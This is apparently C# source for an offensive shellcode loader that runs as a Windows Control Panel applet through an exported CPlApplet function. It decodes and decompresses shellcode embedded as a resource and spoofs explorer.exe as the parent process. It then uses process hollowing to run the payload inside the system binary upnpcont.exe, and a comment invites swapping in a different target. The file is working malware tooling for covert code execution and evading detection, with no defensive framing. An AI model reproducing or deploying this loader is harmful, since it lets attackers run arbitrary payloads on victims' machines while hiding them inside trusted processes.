using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;

using TikiLoader;
using RGiesecke.DllExport;

public class TikiCpl
{
    private static string ExtractResource(string filename)
    {
        var assembly = Assembly.GetExecutingAssembly();
        var resourceName = filename;

        using (Stream stream = assembly.GetManifestResourceStream(resourceName))
        using (StreamReader reader = new StreamReader(stream))
        {
            string result = reader.ReadToEnd();
            return result;
        }

    }

    private delegate IntPtr GetPebDelegate();

    public static int FindProcessPid(string process)
    {
        int pid = 0;

        int session = Process.GetCurrentProcess().SessionId;

        Process[] processes = Process.GetProcessesByName(process);

        foreach (Process proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }

        return pid;
    }

    [DllExport("CPlApplet", CallingConvention = CallingConvention.StdCall)]
    public unsafe static IntPtr CPlApplet()
    {
        string scode = ExtractResource("TikiCpl.Resource.txt");
        byte[] blob = Convert.FromBase64String(scode);
        byte[] shellcode = Generic.DecompressShellcode(blob);

        if (shellcode.Length == 0) return IntPtr.Zero;
            int ppid = FindProcessPid("explorer");
            if (ppid == 0)
            {
                Environment.Exit(1);
            }

        try
        {
            var hollower = new Hollower();
            // Change the binary you want to inject shellcode into
            string binary = @"C:\windows\system32\upnpcont.exe";
            hollower.Hollow(binary, shellcode, ppid);
            return IntPtr.Zero;
        }
        catch
        {
            return IntPtr.Zero;
        }

    }
}